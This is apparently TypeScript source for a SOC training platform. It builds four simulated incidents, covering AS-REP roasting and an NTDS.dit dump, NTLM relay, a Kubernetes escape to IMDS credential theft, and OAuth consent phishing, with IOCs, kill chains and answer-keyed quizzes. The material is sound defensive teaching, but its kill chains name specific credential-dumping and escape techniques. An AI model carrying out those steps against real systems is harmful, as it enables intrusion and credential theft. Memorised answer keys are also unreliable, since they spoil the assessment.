        { value: "a", label: "SeBackupPrivilege allows reading any file regardless of ACLs, including ntds.dit, which contains NTLM hashes for all domain accounts" },
        { value: "b", label: "SeBackupPrivilege lets the holder register scheduled tasks that run as SYSTEM, giving code execution on the domain controller at every boot" },
        { value: "c", label: "SeBackupPrivilege adds the account to the Remote Desktop Users group, allowing an interactive session on any domain controller" },
        { value: "d", label: "SeBackupPrivilege lets the account stop the Windows Defender service and clear its exclusion list, blinding detection on the host" },
      ],
      answer: "a",
      explanation: "SeBackupPrivilege bypasses file ACLs for backup purposes, and combined with ntdsutil it allows a copy of NTDS.dit, the AD database holding an NTLM hash for every domain account. The detail that matters is WHERE the privilege is held. The grant on SRV-FILE01 gave the attacker nothing on the domain controller; what made the dump possible is the 4672 on DC01 (asrep_09i), logged at the svc-backup logon from WS-DEV-09 at 15:12, which lists SeBackupPrivilege and SeRestorePrivilege, privileges only members of Backup Operators (or Administrators) receive at logon. That standing entitlement is the finding for the report: the account did not need to be escalated, it was already over-privileged on the domain controller, and no amount of password rotation fixes that.",
    },
    {
      id: "q4", xp: 25,
      prompt: "What is the correct immediate remediation for this attack?",
      kind: "single",
      options: [
        { value: "a", label: "Reset svc-backup's password to a 25-character random value, migrate it to a Group Managed Service Account, and monitor Event ID 4768 for further TGT requests" },
        { value: "b", label: "Network-contain WS-DEV-09 with the EDR isolation action, reimage the host from a clean image, and block the attacker's outbound IP at the perimeter firewall" },
        { value: "c", label: "Enable Kerberos pre-authentication on the three accounts by clearing the DONT_REQ_PREAUTH bit in userAccountControl, then apply a fine-grained password policy" },
        { value: "d", label: "Enable pre-authentication on all three accounts AND treat the whole domain as compromised: reset all passwords, including krbtgt twice (NTDS.dit was read)" },
      ],
      answer: "d",
      explanation: "Since ntdsutil wrote a copy of NTDS.dit (asrep_10) and the archive was pulled to WS-DEV-09 (asrep_10e), all domain credentials are compromised. Response must include: (1) Enable pre-auth on affected accounts. (2) Reset all domain account passwords. (3) Reset krbtgt password TWICE (golden ticket prevention). (4) Force-expire all active Kerberos tickets. Isolating the workstation (option b) is also needed, but on its own it leaves every hash in the stolen database usable. The logs here end at the internal pull; no outbound transfer is visible, so treat the data as exposed.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT28 (Fancy Bear)",
    attack_kind: "Credential Access / Lateral Movement",
    briefing: "Defender for Identity raised a credential-access alert at 09:03 UTC with WS-DEV-09 (10.0.1.45) as the source and three service accounts as targets. The ticket was picked up at 15:30 UTC, so the logs run to the early afternoon. DC01's Security log, the firewall and the EDR on WS-DEV-09, SRV-FILE01 and DC01 are available.",
    narrative: "APT28 operator with a foothold on developer workstation WS-DEV-09 lists the NexaCorp service accounts that have Kerberos pre-authentication disabled with a Get-ADUser filter. Using Impacket GetNPUsers.py, they request AS-REP responses (TGTs) for three of them without providing credentials. The RC4-encrypted hashes are cracked offline (silent period, no logs). Almost six hours later the cracked svc-backup password is used with Impacket wmiexec.py from the same workstation: first against SRV-FILE01, where a WMI shell enumerates Domain Admins, then against the domain controller. The account holds Backup Operators rights on DC01 (and remote WMI access there, so the backup agent can drive jobs), so ntdsutil is used to create an IFM snapshot containing the AD database; the snapshot is compressed and pulled back to WS-DEV-09 over the C$ share. These logs end at that internal copy: no outbound transfer is visible, so the data must be treated as exposed.",
    learning_objectives: [
      "Understand that Kerberos Event 4768 with PreAuthType=0 means the account is vulnerable to AS-REP Roasting",
      "Recognize Impacket tooling signatures in EDR logs (GetNPUsers.py, wmiexec.py, a WMI-spawned cmd.exe redirecting output to ADMIN$)",
      "Understand why a six-hour silence between roasting and the first use of the account indicates offline cracking",
      "Know that SeBackupPrivilege enables NTDS.dit access without Domain Admin rights, and read it from the 4672 on the domain controller",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── NTLM Relay — Internal Credential Hijacking (⭐⭐⭐ Advanced) ────────────

export function buildNtlmRelayScenario(scenarioId = "ntlm-relay-responder"): ScenarioBundle {
  const { title, events, T, MIN } = ntlmRelayScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: "10.0.1.45",                                 reputation: "malicious", tags: ["ws-dev-09", "kerberos-and-smb-source"] },
    { type: "ip",     value: "45.142.212.61",                             reputation: "malicious", tags: ["vpn-source", "tool-staging", "netherlands"] },
    { type: "sha256", value: makeSha256("inveigh_exe_llmnr_poisoner"), reputation: "malicious", tags: ["poisoning-tool", "workstation"] },
    { type: "sha256", value: makeSha256("PSEXESVC-ntlm-relay-2026"),     reputation: "malicious", tags: ["psexec", "lateral-movement", "remote-exec"] },
    { type: "host",   value: "WS-DEV-09",                                 reputation: "suspicious", tags: ["internal-host", "attacker-pivot"] },
    { type: "user",   value: "svc-deploy",                                reputation: "suspicious", tags: ["credential-exposed-lsass", "lateral-movement"] },
  ];

  const killchain = [
    { ts: T(-44 * MIN),   phase: "Initial Access",    action: "m.johnson's SSL-VPN tunnel comes up from 45.142.212.61 (Netherlands) and is assigned 10.8.0.14 (T1078)" },
    { ts: T(-40 * MIN),   phase: "Initial Access",    action: "Remote Desktop logon (Type 10) to WS-DEV-09 as m.johnson from the tunnel address: the foothold the poisoner runs under (T1021.001)" },
    { ts: T(-150_000),    phase: "Resource Development", action: "powershell.exe downloads Inveigh.exe over HTTP from the same external address and writes it to m.johnson's Temp folder (T1105)" },
    { ts: T(-10_000),     phase: "Credential Access", action: "Inveigh.exe starts on WS-DEV-09 with LLMNR and NBNS poisoning enabled; python.exe starts ntlmrelayx targeting SRV-FILE01 (T1557.001)" },
    { ts: T(-6_000),      phase: "Detection",         action: "EDR raises a critical, detect-only alert on Inveigh.exe: the process keeps running" },
    { ts: T(-3_000),      phase: "Collection",        action: "WS-FIN-03 asks the DNS server for finance-archive.nexacorp.com and gets NXDOMAIN; the poisoner answers the fallback name lookup (T1557.001)" },
    { ts: T(5_000),       phase: "Credential Access", action: "WS-FIN-03 opens an SMB session to 10.0.1.45 instead of a file server; l.nguyen's NTLM challenge-response is relayed to SRV-FILE01" },
    { ts: T(8_000),       phase: "Lateral Movement",  action: "Relay succeeds: l.nguyen authenticated to SRV-FILE01 from attacker IP 10.0.1.45 while the record still names WS-FIN-03; admin privileges follow (T1078)" },
    { ts: T(15 * MIN),    phase: "Execution",         action: "PSEXESVC.exe copied to ADMIN$ and installed as a service over the relayed session: SYSTEM execution on SRV-FILE01 (T1021.002)" },
    { ts: T(16 * MIN),    phase: "Discovery",         action: "net user /domain enumerates all domain accounts from the SYSTEM shell (T1087.002)" },
    { ts: T(18 * MIN),    phase: "Credential Access", action: "rundll32 comsvcs.dll MiniDump opens lsass.exe with 0x1FFFFF and writes C:\\Windows\\Temp\\lsass.dmp (T1003.001)" },
    { ts: T(25 * MIN),    phase: "Lateral Movement",  action: "net use with the svc-deploy account recovered from LSASS, then SMB sessions and network logons on SRV-APP01, SRV-SQL01 and DC01 (T1021.002)" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 25,
      prompt: "Which single event confirms that the attacker's name-poisoning tool is running, before any credential has been captured?",
      kind: "single",
      options: [
        { value: "a", label: "ntlm_01: WS-FIN-03's query for finance-archive.nexacorp.com that the DNS server answered with NXDOMAIN" },
        { value: "b", label: "ntlm_03: WS-FIN-03 opening an SMB session to another workstation rather than to a departmental file server" },
        { value: "c", label: "ntlm_04: an LLMNR/NBNS poisoning tool running on WS-DEV-09 with its listener flags in the command line" },
        { value: "d", label: "ntlm_05: l.nguyen successfully authenticating to SRV-FILE01 over NTLM with a type-3 network logon" },
      ],
      answer: "c",
      explanation: "ntlm_04 is the only record that is unambiguous on its own. A failed lookup is ordinary Windows behaviour whenever a name is mistyped or retired, and a workstation-to-workstation SMB session is unusual without being proof of anything. ntlm_05 is genuinely damning once you read WorkstationName against IpAddress, but that takes a comparison, and it only exists after the credential has already been relayed, whereas a process whose command line enables LLMNR and NBNS poisoning has no legitimate purpose on a corporate endpoint and needs no correlation to interpret. It is also the earliest point at which containment would still have prevented the relay.",
    },
    {
      id: "q2", xp: 20,
      prompt: "ntlm_05 is a successful 4624 for l.nguyen on SRV-FILE01. Reading only that one record, what marks it as a relayed authentication?",
      kind: "single",
      options: [
        { value: "a", label: "l.nguyen holds no group membership in the SRV-FILE01 share ACL, so a successful logon recorded for that account cannot be genuine" },
        { value: "b", label: "WorkstationName says WS-FIN-03 but the connection came from 10.0.1.45: the machine naming itself is not the one that connected" },
        { value: "c", label: "The logon negotiated NTLM rather than Kerberos, and NTLM against a domain-joined file server is sufficient proof of a relay on its own" },
        { value: "d", label: "The LogonType is 3 (network) rather than 2 (interactive), which is unexpected for a user reaching a file server holding departmental shares" },
      ],
      answer: "b",
      explanation: "One record contradicts itself, and that is the whole finding. The relaying tool forwards the victim's NTLMSSP_AUTH message byte for byte: it cannot rewrite the workstation name inside it without invalidating the message integrity code and breaking the authentication it is trying to complete. So the name travels with the stolen blob (WS-FIN-03, the victim) while the packet is emitted by the attacker's host (10.0.1.45). Those two fields describing different machines in a single 4624 is the highest-fidelity relay indicator there is, and it needs no asset inventory to spot: the record impeaches itself. Option (c) is the common overreach: NTLM to a file server is extremely ordinary, and treating it as proof would bury a SOC in false positives. Option (d) is simply what a file share looks like: LogonType 3 is the normal case there. Option (a) inverts how authentication and authorisation relate: the 4624 records that the credential was accepted, and share permissions are evaluated afterwards.",
    },
    {
      id: "q3", xp: 15,
      prompt: "What allowed the name poisoning and the relay itself to succeed (as opposed to what made the damage afterwards larger)?",
      kind: "single",
      options: [
        { value: "a", label: "l.nguyen was a local administrator on SRV-FILE01, which let the relayed session install a service" },
        { value: "b", label: "LLMNR/NBT-NS was enabled on the network AND SMB signing was not required on SRV-FILE01" },
        { value: "c", label: "The attacker had physical access to WS-DEV-09 and plugged a rogue device into the switch" },
        { value: "d", label: "Windows Defender real-time protection was disabled on WS-FIN-03, so the tool ran unblocked" },
      ],
      answer: "b",
      explanation: "Two conditions had to hold at once. LLMNR/NBT-NS being enabled is what let the attacker answer a name lookup they had no right to answer: that is the poisoning step. SMB signing not being required on SRV-FILE01 is what let the stolen authentication be accepted from a machine that did not originate it. Signing does not DETECT a relay; it PREVENTS one, and the mechanism matters: signing binds the session to a key derived during authentication, and the relaying attacker never possesses that key because they only forward the victim's messages without ever learning the secret behind them. (The signing state itself is not in these logs; it is confirmed from the server's SMB configuration or a vulnerability scan.) Option (a) is real and worth fixing, but it is what turned a relay into SYSTEM execution (the 4672 right after the relayed logon shows administrator privileges), not what made the relay possible: with a non-administrator the same relay would have reached only the shares she can use. The same reasoning explains why changing l.nguyen's password does not help: the attacker never learned her password or her hash, they borrowed a live authentication and spent it. Remediation is disabling LLMNR and NBT-NS by GPO and requiring SMB signing on servers, and neither is a detection control.",
    },
    {
      id: "q4", xp: 20,
      prompt: "Which detection approach would have caught the poisoning tool in ntlm_04 before the relay succeeded?",
      kind: "single",
      options: [
        { value: "a", label: "Monitoring all UDP 5355 LLMNR broadcast traffic on the workstation VLAN and alerting on any spike in name-resolution volume from one host" },
        { value: "b", label: "EDR process detection: the binary is known, and a command line enabling LLMNR and NBNS poisoning has no legitimate use on an endpoint" },
        { value: "c", label: "Configuring a firewall rule that denies inbound TCP 445 to SRV-FILE01 from every workstation subnet, so an SMB relay cannot reach it" },
        { value: "d", label: "Alerting on every NTLM authentication failure recorded as Event ID 4625 on member servers, and treating each one as a possible relay attempt" },
      ],
      answer: "b",
      explanation: "EDR catches the tool before a single credential is captured, which is the only point at which this is still preventable rather than merely detectable. Monitoring LLMNR broadcast volume fails because broadcasts are constant baseline noise on any Windows network and the poisoner adds almost none of it: the attacker ANSWERS traffic rather than generating it. Denying inbound 445 from workstation subnets is a prevention control rather than a detection, and it would break ordinary file sharing while doing nothing about the lateral sessions that start from a server. Alerting on every 4625 buries the SOC in noise and, in this scenario, would have found nothing at all: a relay produces no failed logon on the poisoning host.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "FIN7 (compromised internal machine)",
    attack_kind: "Credential Access / Lateral Movement",
    briefing: "CrowdStrike raised a tooling detection on WS-DEV-09 at 10:11 UTC. The DNS log shows a failed name lookup from WS-FIN-03 seconds later, and SRV-FILE01 later recorded a service installation and a network logon for l.nguyen, a finance analyst who is a member of that server's local Administrators group through a legacy delegation for the finance share. All of it is on one ticket.",
    narrative: "An operator signs in to the NexaCorp SSL-VPN with developer m.johnson's credentials from a hosting-provider address, opens a Remote Desktop session on WS-DEV-09 and downloads Inveigh from the same address. They run Inveigh to answer fallback name lookups and ntlmrelayx, pointed at SRV-FILE01, to catch the resulting SMB sessions. When finance analyst l.nguyen's machine (WS-FIN-03) looks up a share name DNS cannot resolve, the poisoner answers and presents itself as the target. WS-FIN-03 sends its NTLM authentication, which is relayed onward to SRV-FILE01, arriving from the attacker's address while still carrying the victim's workstation name inside it. Because l.nguyen is a local administrator on that server, the relayed session can install PSEXESVC for SYSTEM execution; the attacker dumps LSASS credentials with comsvcs.dll and pivots to three additional internal servers with a harvested service account. No C2 beacon is visible and nothing is dropped on WS-FIN-03: the single external address was used for the VPN login and the tool download only.",
    learning_objectives: [
      "Correlate three low-fidelity events (a failed DNS lookup, an SMB session to a workstation, a network logon on a server) into a single attack chain",
      "Identify that relay auth source IP differs from the victim's actual workstation IP",
      "Understand that LLMNR disable + SMB signing are the dual prerequisites for relay prevention",
      "Recognise an LLMNR/NBNS poisoning tool from its listener flags in EDR command lines",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── Kubernetes Pod Escape → Cloud Metadata Theft (⭐⭐⭐ Advanced) ──────────

export function buildK8sPodEscapeScenario(scenarioId = "k8s-pod-escape-imds"): ScenarioBundle {
  const { title, events, T, MIN } = k8sPodEscapeScenarioEvents();

  const iocs: IOC[] = [
    { type: "ip",     value: "193.233.48.71", reputation: "malicious", tags: ["external-hosting-provider", "attacker-source", "imds-query-origin", "cloudtrail-source"] },
    { type: "user",   value: "svc-monitoring-backup", reputation: "malicious", tags: ["iam-principal", "administrator-access", "persistence"] },
    // Were two `sha256` IOCs seeded from strings like "eks-node-role-credentials-stolen". Neither
    // appeared in any event, and neither could: IAM credentials and an S3 object fetched via
    // GetObject produce no file hash in this telemetry. Replaced with indicators the analyst can
    // actually pivot on, each of them a value that appears whole in a record.
    { type: "user",   value: "arn:aws:sts::482910374256:assumed-role/eks-node-role/i-0a3f9c12d7b54e681", reputation: "suspicious", tags: ["assumed-role", "credential-source"] },
    { type: "user",   value: "system:serviceaccount:cicd:ci-deploy", reputation: "suspicious", tags: ["kubernetes-service-account", "stolen-token"] },
    { type: "url",    value: "arn:aws:s3:::rocketstack-secrets-prod/db-passwords.json", reputation: "suspicious", tags: ["accessed-object", "secrets-bucket"] },
    { type: "url",    value: "193.233.48.71:5000/metrics-agent:2.4", reputation: "malicious", tags: ["attacker-registry", "image-source"] },
  ];

  const killchain = [
    { ts: T(0),           phase: "Execution",         action: "kubectl exec into api-prod container with the stolen ci-deploy service account token from external hosting-provider IP 193.233.48.71 (T1609)" },
    { ts: T(1 * MIN),     phase: "Discovery",         action: "The pod spec is read: privileged, hostPID and CAP_SYS_ADMIN, scheduled on node ip-10-0-14-73 (T1613)" },
    { ts: T(2 * MIN),     phase: "Execution",         action: "nsenter with host mount, uts, ipc, net and pid namespaces: container escape to the EC2 node, root bash on the host (T1611)" },
    { ts: T(3 * MIN),     phase: "Credential Access", action: "curl to 169.254.169.254 IMDS: IAM role credentials for eks-node-role retrieved and written to /tmp/.cache/.env (T1552.005)" },
    { ts: T(5 * MIN),     phase: "Credential Access", action: "GetCallerIdentity from the external IP confirms the stolen credentials are valid; GuardDuty flags the exfiltrated instance credentials (T1078.004)" },
    { ts: T(6 * MIN),     phase: "Discovery",         action: "ListBuckets + DescribeInstances: attacker mapping the AWS account from outside (T1580)" },
    { ts: T(9 * MIN),     phase: "Exfiltration",      action: "GetObject s3://rocketstack-secrets-prod/db-passwords.json: production DB credentials stolen (T1530)" },
    { ts: T(12 * MIN),    phase: "Persistence",       action: "Privileged pod 'svc-monitoring-backup' created in kube-system with hostPID+hostNetwork from an image pulled from 193.233.48.71:5000 (T1610)" },
    { ts: T(15 * MIN),    phase: "Persistence",       action: "IAM user 'svc-monitoring-backup' created with AdministratorAccess and an access key: cloud-level backdoor established (T1136.003)" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 15,
      prompt: "What detail in k8s_01_kubectl_exec makes this exec suspicious for the ci-deploy service account?",
      kind: "single",
      options: [
        { value: "a", label: "The container name 'api-prod-7f8b9c' does not match the deployment naming convention used in this cluster" },
        { value: "b", label: "kubectl exec that spawns an interactive shell in a production namespace is malicious regardless of source" },
        { value: "c", label: "The source IP 193.233.48.71 is external: it is not the CI runner (34.201.17.88) that the baseline deployment patch came from, not corporate, and not AWS" },
        { value: "d", label: "The CI/CD service account token was used, and pipeline tokens should be scoped to deployments, not exec" },
      ],
      answer: "c",
      explanation: "kubectl exec from an internal developer IP is routine. Here sourceIPs[0] is 193.233.48.71, a public address on a hosting provider's network. The baseline row (k8s_00_baseline_ci_deploy) shows how this service account is normally used: a patch of the api-prod deployment from the CI runner 34.201.17.88. A CI token is only ever used from the CI infrastructure, so the same token calling the API from an unrelated external host means it was stolen and replayed. That source address is the distinguishing detail that separates routine debugging from an intrusion. The container name is not evidence, an interactive exec is not malicious by itself, and the token being able to exec is a hardening gap (the permission was too broad) rather than proof of compromise.",
    },
    {
      id: "q2", xp: 20,
      prompt: "The curl to 169.254.169.254 (k8s_03_imds_query) is a request to the AWS Instance Metadata Service. Why is this particularly dangerous in a Kubernetes context?",
      kind: "single",
      options: [
        { value: "a", label: "It exposes the container's environment variables, including any secrets the pod spec injected as plaintext env entries at runtime" },
        { value: "b", label: "IMDS returns IAM role credentials that grant cloud API access OUTSIDE the cluster: the attacker moves from container to cloud" },
        { value: "c", label: "It lets the attacker sniff traffic from other pods on the same node, since every container shares the host network namespace" },
        { value: "d", label: "The IMDS response carries the cluster's admin kubeconfig, handing the attacker full control of the Kubernetes control plane" },
      ],
      answer: "b",
      explanation: "The IMDS link-local address (169.254.169.254) is reachable from any process on the EC2 node, including containers when IMDSv1 or a hop limit above 1 allows it. After the nsenter escape, the attacker queries IMDS from the host OS, first for the role name and then for its credentials, and receives the IAM role credentials attached to the EC2 node. These are valid AWS API keys: the attack pivots from the Kubernetes cluster into the entire AWS account. IMDSv2 (session-token based requests) would have blocked the simple, unauthenticated GET shown in the two curl rows.",
    },
    {
      id: "q3", xp: 20,
      prompt: "The CloudTrail rows k8s_05 to k8s_08 show AWS API calls from IP 193.233.48.71 with the eks-node-role session. What is the primary indicator that these credentials were stolen?",
      kind: "single",
      options: [
        { value: "a", label: "The calls were made over plain HTTP to the AWS endpoint, so the SigV4 signature and session token travelled in the clear" },
        { value: "b", label: "The IAM role eks-node-role is over-permissive: a node role needs EC2 and ECR permissions, not s3:ListAllMyBuckets across the account" },
        { value: "c", label: "The source IP 193.233.48.71 is not an AWS IP range: legitimate EC2 role usage comes from AWS IP ranges, not external IPs" },
        { value: "d", label: "sts:GetCallerIdentity returned the full account ID and role ARN, handing the attacker the account details needed to plan escalation" },
      ],
      answer: "c",
      explanation: "When an EC2 instance uses its IAM role normally, CloudTrail shows the source IP as the EC2's private or public IP (within AWS IP ranges). Seeing eks-node-role calls from an external IP (193.233.48.71) means the credentials were stolen and are being used from outside AWS: a clear indicator of IMDS credential theft, and exactly what the GuardDuty finding UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS reports. The over-permissive role is a real hardening gap (it is what lets the stolen session create an IAM user), but a permissive role used from its own instance would look unremarkable: it is not what shows the credentials were stolen.",
    },
    {
      id: "q4", xp: 25,
      prompt: "What is the correct priority order for containing this incident?",
      kind: "single",
      options: [
        { value: "a", label: "Delete the backdoor IAM user → Rotate EKS node credentials → Delete privileged pod → Investigate how the CI/CD token was stolen → Enable IMDSv2 afterwards" },
        { value: "b", label: "Rotate the CI/CD deploy token first → Review the Kubernetes audit logs → Rotate eks-node-role credentials once the full scope is known" },
        { value: "c", label: "Isolate EKS node → Revoke eks-node-role credentials → Rotate CI/CD deploy token → Delete IAM user svc-monitoring-backup and its access key → Delete privileged pod → Enable IMDSv2" },
        { value: "d", label: "Snapshot the node's EBS volume → Open a case with AWS Support → Wait for their guidance before revoking anything, to avoid tipping off the attacker" },
      ],
      answer: "c",
      explanation: "Correct sequence: (1) Isolate the EKS node, which cuts the attacker's shell and the credential source. (2) Revoke the eks-node-role session credentials immediately (attach a deny-before-time policy), which stops every active cloud API call made with the stolen credentials. (3) Rotate the CI/CD deploy token, the attacker's way back into the cluster: leaving it for last means they can recreate the pod while you clean up. (4) Delete the svc-monitoring-backup IAM user and its access key, which closes the cloud-level backdoor. (5) Delete the privileged pod in kube-system, which closes the cluster-level backdoor. (6) Enforce IMDSv2 with a hop limit of 1 so containers cannot reach the metadata service this way again. Evidence (the node's disk, the audit logs) is preserved in parallel, not by waiting.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT40",
    attack_kind: "Cloud Attack / Container Escape",
    briefing: "GuardDuty raised a finding against the production EKS cluster at 02:50 UTC for anomalous use of the eks-node-role credentials. The Kubernetes audit log separately shows exec activity into container api-prod-7f8b9c by the ci-deploy service account (cicd namespace). EDR runs on the cluster nodes.",
    narrative: "APT40 obtains a compromised CI/CD deploy token and uses it to exec into a production container via kubectl. The pod runs privileged with hostPID, so nsenter takes them to the EC2 node OS, where they query the AWS Instance Metadata Service (169.254.169.254) to steal the IAM role credentials bound to the node. From an external hosting-provider IP, they enumerate the AWS account, access a secrets S3 bucket containing production database passwords, create a privileged pod in kube-system from an image on their own registry for cluster persistence, and create a backdoor IAM user with AdministratorAccess and an access key. Four log sources must be correlated: Kubernetes audit, EDR on the node, AWS CloudTrail and GuardDuty.",
    learning_objectives: [
      "Understand the container escape path: kubectl exec → nsenter → host OS access",
      "Know that IMDS (169.254.169.254) queries from containers can steal IAM credentials",
      "Identify that CloudTrail API calls from external IPs using an EC2 role = credential theft",
      "Correlate independent log sources (K8s audit + EDR + CloudTrail + GuardDuty) into one attack chain",
    ],
    alerts: eventsToAlerts(events, scenarioId),
    events, iocs, killchain, questions,
  };
}

// ─── OAuth Consent Grant Phishing — Silent BEC (⭐⭐⭐⭐ Expert) ─────────────

export function buildOAuthConsentPhishingScenario(scenarioId = "oauth-consent-grant-phishing"): ScenarioBundle {
  const { title, events, T, MIN, APP_ID } = oauthConsentPhishingScenarioEvents();

  const iocs: IOC[] = [
    { type: "domain", value: "productivty-suite.com",         reputation: "malicious", tags: ["lookalike", "oauth-phishing", "redirect-uri", "sender-domain", "missing-i"] },
    { type: "email",  value: "no-reply@productivty-suite.com", reputation: "malicious", tags: ["phishing-sender"] },
    { type: "email",  value: "backupmail@productivity-suite.pro", reputation: "malicious", tags: ["exfil-target", "inbox-forwarding", "lookalike-domain-family"] },
    { type: "ip",     value: "20.50.142.37",                  reputation: "malicious", tags: ["app-backend", "cloud-hosted", "graph-caller"] },
    // IOC types have no "application" member; "user" is the closest identity-shaped type for an OAuth client id.
    { type: "user",   value: APP_ID,                          reputation: "malicious", tags: ["oauth-client-id", "rogue-oauth-app", "productivity-suite-pro", "unverified-publisher"] },
  ];

  const killchain = [
    { ts: T(-22 * MIN),   phase: "Initial Access",        action: "Lure from no-reply@productivty-suite.com delivered to j.chen with a Microsoft sign-in link carrying the rogue app's client id (T1566.002)" },
    { ts: T(-20_000),     phase: "Initial Access",        action: "j.chen clicks the link from her home address; Safe Links allows the click (T1566.002)" },
    { ts: T(0),           phase: "Initial Access",        action: "j.chen grants 'Productivity Suite Pro' Mail.ReadWrite + MailboxSettings.ReadWrite + Files.ReadWrite.All + Calendars.Read (T1528)" },
    { ts: T(55 * MIN),    phase: "Collection",            action: "App reads 1,247 mailbox items through Microsoft Graph (three MailItemsAccessed records) as AppId a3f9b1c2 from 20.50.142.37 (T1114.002)" },
    { ts: T(58 * MIN),    phase: "Persistence",           action: "Inbox forwarding rule created through the app's token to backupmail@productivity-suite.pro (T1114.003)" },
    { ts: T(61 * MIN),    phase: "Collection",            action: "Nine Finance SharePoint files downloaded with a python-requests client, including Contract-GlobalLogis-2026.docx (T1530)" },
    { ts: T(65 * MIN),    phase: "Discovery",             action: "847 calendar items read: org chart reconstruction via meeting attendees (T1114.002)" },
    { ts: T(72 * MIN),    phase: "Detection",             action: "Purview DLP matches the GlobalLogis contract download by a non-corporate client" },
    { ts: T(75 * MIN),    phase: "Detection",             action: "Defender for Cloud Apps flags the app: created two days earlier, unverified publisher, one consenting user, high permission level" },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1", xp: 25,
      prompt: "Which evidence in the logs best shows that 'Productivity Suite Pro' is not a normal business app?",
      kind: "single",
      options: [
        { value: "a", label: "The app requested Mail.ReadWrite (write access is unusual for a legitimate archival tool)" },
        { value: "b", label: "The Defender for Cloud Apps alert (oauth_09_mdca_alert) shows the app was created two days earlier, has an unverified publisher and exactly one consenting user" },
        { value: "c", label: "The consent came from 86.9.140.22, which is not a known corporate egress address" },
        { value: "d", label: "The consent happened at 22:14 UTC (23:14 UK time), outside j.chen's normal business hours" },
      ],
      answer: "b",
      explanation: "App age, publisher verification and the number of consenting users are what separate a rogue app from a business one, and they sit in the app-governance record, not in the user's sign-in. Legitimate enterprise apps (Slack, Zoom, Salesforce) are years old, publisher-verified and used by many people; a two-day-old app with an unverified publisher and a single user that asks for broad mail and file permissions is a major red flag. The other options are weak on their own: Mail.ReadWrite is suspicious but plenty of real tools ask for it; a home address is where staff often read mail in the evening, so it proves nothing about the app; and the hour is context, not evidence. (The app's registration itself happened in the attacker's own tenant, so NexaCorp's logs never show it being created.)",
    },
    {
      id: "q2", xp: 20,
      prompt: "oauth_04_inbox_rule shows AppId a3f9b1c2-d4e5-4f67-8901-ab2cd3ef4567 instead of Outlook's 00000002-0000-0ff1-ce00-000000000000, while UserId is j.chen@nexacorp.com. What does this indicate?",
      kind: "single",
      options: [
        { value: "a", label: "j.chen created the rule herself in the Outlook web UI, and the audit log records the app GUID as the client identifier" },
        { value: "b", label: "The rule was created by the OAuth app using the delegated token j.chen granted: the user is the identity the app acts as, the AppId says what actually made the call" },
        { value: "c", label: "The New-InboxRule operation failed because the app lacks Mail.ReadWrite, and denied attempts are logged under the app GUID" },
        { value: "d", label: "A second attacker signed in with j.chen's stolen password, and Exchange logs the registered app GUID for such sessions" },
      ],
      answer: "b",
      explanation: "With delegated permissions the app acts as the user, so the audit record names j.chen in UserId and the calling application in AppId (and the client string reads Client=REST;Client=RESTSystem;; instead of Outlook's). What gives the app away is therefore the AppId, the REST client, the source address 20.50.142.37 (j.chen's own activity comes from her home or office address) and the fact that no sign-in by j.chen exists at that hour. When UserId is an application GUID instead, the call was made with app-only (application) permissions, which is a different grant type than the one in oauth_01. No password was used, so a password reset would not have stopped any of this, and the rule succeeded: it is the persistence the app then relied on. The app needed MailboxSettings.ReadWrite for this call, which is why that scope appears in the consent.",
    },
    {
      id: "q3", xp: 20,
      prompt: "Which combination of fields best separates the app's mailbox reads (oauth_02) from j.chen's own use of Outlook?",
      kind: "single",
      options: [
        { value: "a", label: "The AppId, the REST client string, the source address 20.50.142.37 and no j.chen sign-in at that time" },
        { value: "b", label: "The UserId, because only the calls made by the application are written with j.chen's own email address" },
        { value: "c", label: "The MailAccessType, because a Bind operation can only ever be made by an application and never by a person" },
        { value: "d", label: "The record type, because only applications produce RecordType 50 MailItemsAccessed entries in the audit log" },
      ],
      answer: "a",
      explanation: "In delegated access the UserId is j.chen for both her own Outlook use and the app's calls, so UserId separates nothing. What differs is who the calling application is (AppId), how it connects (a REST client rather than an Outlook client), where it connects from (a cloud-hosted address rather than her usual one) and what surrounds it (no interactive sign-in by j.chen at 23:09 UK time). Bind and RecordType 50 are produced by ordinary Outlook use as well. This attack is silent by design: there is no malware, no credential theft and no password to reset, only a legitimate Graph API grant. Detection therefore rests on app reputation and behaviour, not on signatures.",
    },
    {
      id: "q4", xp: 25,
      prompt: "What are the two immediate containment actions?",
      kind: "multi",
      options: [
        { value: "a", label: "Revoke the OAuth consent grant for 'Productivity Suite Pro' (App ID a3f9b1c2…) in Azure AD Enterprise Applications" },
        { value: "b", label: "Delete the inbox forwarding rule to productivity-suite.pro from j.chen's mailbox" },
        { value: "c", label: "Force a password reset for j.chen and require re-registration of their MFA method in Entra ID before re-enabling sign-in" },
        { value: "d", label: "Add 20.50.142.37 to the perimeter firewall deny list so the application can no longer reach the tenant from that address" },
      ],
      answer: ["a", "b"],
      explanation: "Priority: (1) Revoke the OAuth consent, which terminates the app's access token and all API access. (2) Delete the inbox forwarding rule, which stops ongoing email exfiltration. Password reset (c) is wrong: the attacker never used j.chen's password, they used the OAuth token, so a reset leaves the grant and the rule in place. A firewall deny entry (d) is also wrong: the calls go to Microsoft's cloud APIs, not through NexaCorp's perimeter, and the address sits in shared Azure space that the operator can change at will.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT29 / Cozy Bear",
    attack_kind: "Identity Attack / Business Email Compromise",
    briefing: "Microsoft Purview DLP fired at 23:26 UTC on a contract in the Finance SharePoint site, and Defender for Cloud Apps flagged an OAuth app named 'Productivity Suite Pro' that j.chen had authorized earlier that evening. Log times are UTC; NexaCorp's offices run on UK time (UTC+1).",
